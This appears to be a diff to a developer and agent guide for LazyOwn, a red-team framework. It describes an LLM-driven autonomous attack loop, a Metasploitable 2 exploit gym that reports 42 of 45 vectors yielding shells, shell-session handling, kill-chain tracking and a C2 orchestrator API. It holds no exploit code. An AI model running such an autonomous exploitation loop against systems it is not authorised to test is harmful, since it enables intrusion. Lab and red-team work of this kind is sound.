+Profiles, chain v2, outcome bus, emulation runner, addon updates and the MS2 gym: `docs/autonomous-loop.md`, `docs/outcome-bus.md`, `docs/emulation-runner.md`, `docs/metasploitable-gym.md`, `docs/lazyaddons-yaml.md`. Tests: `tests/test_{orchestrator_yaml,chain_runner,outcome_bus,emulation_runner,addon_updater,metasploitable_gym}.py` plus mutation runners.
+
+## 15m. Metasploitable 2 gym setup contracts
+
+Operator setup guide: [`docs/gym-setup.md`](docs/gym-setup.md). Contracts:
+
+- `modules/metasploitable_migrations.py` — idempotent migration list applied automatically on every `lab start metasploitable` (wired in `cli/commands/lab.py::_lab_start`). Each step: `check` script (exit 0 = already applied) then `apply` script run via argv-form `docker exec`. Subnet prefix parameter defaults to `172.17.0.`. Tests: `tests/test_metasploitable_migrations.py`.
+- `modules/world_model._master_password()` — resolution order: `LAZYOWN_MASTER_PASSWORD` env var, then `lazyown:<operator>` via `modules.cli_auth.get_current_operator()` (same key material as `cli/auto_crypto.build_password_provider_from_cli_login`), so MCP subprocesses and background loops decrypt `sessions/world_model.json.encrypted` without extra configuration.
+- `modules/atomic_exploit_bridge.py` — shell sessions are per-vector: `_ShellSession.owner` records the creating/adopting spec id and `_PORT_OWNERS` blocks cross-vector adoption of a `(target, port)` shell. `live_sessions()` exposes the owner. Adoption only succeeds for the first claimant; `close_sessions` releases claims.
+- Browser-backed specs (`ms2_dvwa_xss_dom`, `ms2_twiki_xss`, `ms2_mutillidae_csrf`) run the system interpreter explicitly (`env PATH=/usr/bin:/bin:/usr/sbin:/sbin python3`) and need chromium + chromedriver + selenium; playwright is unusable on Debian until its node driver package ships.
+- Verified matrix: 42/45 vectors yield a shell on the lab; `ms2_dns_recursion` (capset), `ms2_nfs_exports` (kernel module) and `ms2_rlogin_trust` (privileged source port) fail inside Docker by design.
+
+---
+## 16. Killchain Gap Contracts (v3 — unified killchain)
+
+Full per-file contracts: [`docs/killchain_contracts.md`](docs/killchain_contracts.md).
+Kill-chain data comes ONLY from `modules/killchain.py`; every display
+surface consumes its `snapshot()`. Session state travels through
+`modules/world_model` (transparent decrypt of `world_model.json.encrypted`).
+The contract files and their test/mutation gates are enumerated in that doc.
+
+## 16a. LLM + OPSEC consolidation contracts
+
+Full contracts: [`docs/refactor_contracts.md`](docs/refactor_contracts.md). LLM
+backends go through `modules/llm_factory`; OPSEC scoring lives in one
+`modules/opsec_scorer.py`.
+
+### 16a.1 LLM prompt/knowledge layer contract
+
+Prompt templates + KB live in ONE pure contract `modules/llm_prompts.py`; the
+Groq facade `modules/llm_adapter.py` consumes it and MUST NOT import
+`modules.legacy.lazygptcli*` (AST watchdog `tests/test_llm_legacy_isolation.py`).
+Full spec, file table, and remaining legacy debt:
+[`docs/llm_prompt_contract.md`](docs/llm_prompt_contract.md).
+
+
+## 16b. Lint contract — `ruff check .` is green (SDD+TDD+BDD gate)
+
+Full contract and methodology moved to `docs/lint_contract.md`.
+Summary: `ruff check .` zero errors; generated code (`mutants/`) is
+excluded; `ruff format --check` is only required green on touched
+files; do NOT reformat untouched legacy god classes; every lint fix
+follows the SDD inventory, TDD baseline, BDD validation, mutant-kill
+probe order archived in the external document.
+
+
+## 16c. Orchestrator visibility contracts (verb catalog, triggers, brief, C2)
+
+Loop-orchestrator visibility contract (2026-10-19). One file per contract,
+tests + mutation runners green; `./scripts/mutate.sh` scoped and
+`./scripts/test_bdd.sh` run at release time.
+
+| Contract | File | Test / mutation gate |
+|----------|------|----------------------|
+| Verb catalog (834 cmds, YAML source of truth) | `modules/verb_catalog.py`, `config/verbs.yaml` | `tests/test_verb_catalog.py`, `tests/run_mutation_verb_catalog.py` |
+| Declarative trigger policy | `modules/trigger_policy.py`, section `triggers:` in `config/orchestrator.yaml` | `tests/test_trigger_policy.py`, `tests/run_mutation_trigger_policy.py` |
+| TriggerStore extraction (from `lazy_loop`) | `modules/loop_triggers.py` | `tests/test_lazy_loop.py` re-export test |
+| Planner allowed-commands line | `modules/lazy_cli_bridge.py::catalog_cli_for_phase`, wired in `lazy_loop.build_prompt_context` | `tests/test_loop_cli_catalog.py`, `tests/run_mutation_loop_cli_catalog.py` |
+| Orchestrator TUI (Tabbed mixin + Triggers tab) | `cli/orchestrator_assets_tabs.py` (<1000 lines) + `cli/lazy_orchestrator.py` | `tests/test_orchestrator_triggers.py` |
+| Unified toastr (shell + sentinel severities) | `cli/toast_bus.py` (`TOASTR_SEVERITY_STYLES`, `ToastrConfig`) | `tests/test_toastr_unify.py` |
+| Startup session brief (world phase, looping tasks, verbs, triggers) | `cli/session_brief.py`, wired in `lazyown.preloop` | `tests/test_session_brief.py` |
+| C2 orchestrator API + mini panel | `lazyc2/blueprints/orchestrator.py`, `templates/orchestrator_panel.html` | `tests/test_orchestrator_api.py` |
+
+Rules: toggles write `config/verbs.yaml` directly (`verb_catalog.set_enabled`);
+registry management continues via `cli/commands/verb_admin.py` (`verb` command,
+`VerbAdminConfig` for table widths); trigger CLI is `lazy_trigger
+list|add|remove|on|off|seed|policy|addons|sync`; the planner only sees
+catalog-enabled verbs filtered by the current kill-chain phase (fail-closed).
+The generic `/api/data` monolith route stays untouched; the orchestrator state
+mirror lives at `GET /api/v1/orchestrator/panel.json`.
+
 
 ## 16. Read next
 
 - `QUICKSTART.md` — start here for a new operator session.
+- `docs/quality_gates.md` — mutation, BDD, contract manifest, journal gates.
 - `README.md` — public feature list (auto-regenerated by `DEPLOY.sh`).
-- `COMMANDS.md` — every CLI command (auto-generated).
-- `UTILS.md` — `utils.py` reference (auto-generated).
-- `CHANGELOG.md` — release history.
+- `COMMANDS.md`, `UTILS.md`, `CHANGELOG.md` — auto-generated references.
 - `skills/lazyown.md` — MCP playbook (mandatory before MCP session).
-- `skills/README.md` — skills architecture + 95 MCP tools.
+- `skills/README.md` — skills architecture + 173 MCP tools.
 - `<dir>/README.md` — every directory; read before editing.
 
 When in doubt: read `payload.json` → `sessions/` → directory's `README.md` → then write code.
+
+<!-- readmenator-agent-kb-link -->
+## Project Knowledge Base (MUST read before coding)
+
+Generated offline by [ReadMenator](https://github.com/grisuno/ReadMenator) (zero-token static analysis). Humans: `KNOWLEDGE_BASE.md`.
+
+0. Memory: `cat readmenator-agent/MEMORY.md` (business rules, workflow, constraints, style, done criteria, session log). Record new decisions with `readmenator . remember "<note>" --kind decision`.
+1. Freshness: `readmenator . fresh` (exit 1 means stale: run `readmenator . --rebuild`). Without the CLI, compare `git_commit` in `readmenator-agent/MANIFEST.json` with `git log -1`.
+2. Orient: `ls *.md readmenator-agent/ readmenator-wiki/`, then read `readmenator-wiki/index.md` (big picture, communities, god nodes).
+3. Locate: `grep -n '<keyword>' readmenator-agent/INDEX*.md readmenator-agent/SYMBOLS*.md` before any `glob` over sources; for questions use `readmenator . ask "<question>"` (GraphRAG, `--global` for overviews).
+4. Context: `cat readmenator-agent/KB_<subsystem>.md` for the subsystem you touch.
+5. Before editing: `grep -n '<file>' readmenator-agent/GOTCHAS.md readmenator-agent/SECURITY.md` (blast radius, cycles, findings).
+
+Also: `API*.md` (public functions, one line each), `ARCHITECTURE*.md` (dependency pairs), `recipes/*.md` (grounded task steps). Large docs are paged as `NAME_p2.md`, so always grep with `NAME*.md`.
+
+    pip install readmenator && readmenator . --rebuild
+<!-- /readmenator-agent-kb-link -->
